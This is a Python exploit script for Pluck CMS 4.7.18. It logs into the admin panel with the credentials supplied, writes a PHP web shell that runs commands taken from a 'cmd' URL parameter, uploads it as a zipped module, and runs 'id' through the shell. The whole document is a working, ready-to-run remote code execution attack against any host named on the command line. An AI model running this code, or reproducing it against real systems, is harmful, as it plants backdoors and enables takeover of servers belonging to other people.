#! /usr/bin/env python3
#Exploit Title: Pluck v4.7.18 - Remote Code Execution (RCE)
#Application: pluck
#Version: 4.7.18
#Bugs:  RCE
#Technology: PHP
#Vendor URL: https://github.com/pluck-cms/pluck
#Software Link: https://github.com/pluck-cms/pluck
#Date of found: 10-07-2023
#Discovered by: Mirabbas Ağalarov
#Tested on: Linux
#Sense1xenus's exploit
import requests
import os
import zipfile
from requests_toolbelt import MultipartEncoder
import argparse

class Exploit:
      def __init__(self,hostname,username,password):
          self.hostname = hostname
          print(f"[+]Target-:http://{self.hostname}/")
          self.loginUrl = f"http://{self.hostname}/login.php"
          self.uploadUrl = f"http://{self.hostname}/admin.php?action=installmodule"
          self.username = username
          self.password = password
      #Method to login
      def login(self) -> object:
          headers = {"Referer": self.loginUrl}
          login_payload = {"cont1": self.password,self.username: "","submit": "Log in"}
          session = requests.Session()
          print(f"[+]Accessing account with user:[{self.username}]:password:[{self.password}])")
          post_request = session.post(self.loginUrl,headers=headers,data = login_payload).text
          if "Password correct."  in post_request and "pluck 4.7.18" in post_request:
              print("[+] Login Successful")
              print("[+]Compatible Version")
          elif "Password correct" in post_request and "pluck 4.7.18" not in post_request:
               print("[+]Correct credentials")
               print("[+]Incompatible password")
               exit()
          else:
              print("[-] Login error")
              exit()
          return session
      #Method to login and update
      def upload(self):
          session: object = Exploit.login(self)
          zip_name = "lulzme.zip"
          #Shell data
          shell_code = "\"<?php echo system(\$_GET['cmd']); ?>\""
          filename = "lulz123.php"
          print(f"[+]Creating web-shell:{filename} with php code {shell_code}")
          os.system(f"/usr/bin/echo {shell_code} > {filename}")
          #Creating a zipfile
          print("[+]Adding file into a zip")
          try:
              with zipfile.ZipFile(zip_name,mode="w") as archive:
                   archive.write(filename)
          except Exception as e:
                 print("[+]Zipfile error")
                 print(e)
                 exit()
          multipart_data = MultipartEncoder(
                  fields = 
                  {"sendfile": (zip_name, open(zip_name, "rb"), "application/zip"),"submit": "Upload"})
          headers = {"Referer": self.uploadUrl,"Content-Type":multipart_data.content_type}
          result = session.post(self.uploadUrl, headers=headers, data=multipart_data).text
          if "The module has been installed successfully." in result:
              print("[+]Shell module installed successfully")
          else:
              print("[+]Module not installed")
              exit()
          rce_url= f"http://{self.hostname}/data/modules/lulzme/{filename}"
          print(f"[+] Shell Url: {rce_url}")
          print(f"[+]Command 'id':{rce_url}?cmd=id\n",requests.get(rce_url+"?cmd=id").text)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-hst","--host",help="Format: domain.com")
    parser.add_argument("-u","--username",help="Username....")
    parser.add_argument("-p","--password",help="Password....")
    args = parser.parse_args()
    if not args.host:
       print("[-] Host not provided,use --help")
       exit()
    elif not args.username:
        print("[-] Username not provided,use --help")
        exit()
    elif not args.password:
         print("[-] Password not provided,use --help")
    host = args.host
    username = args.username
    password = args.password
    exploit = Exploit(host,username,password)
    exploit.upload()
    
if __name__ == "__main__":
    main()



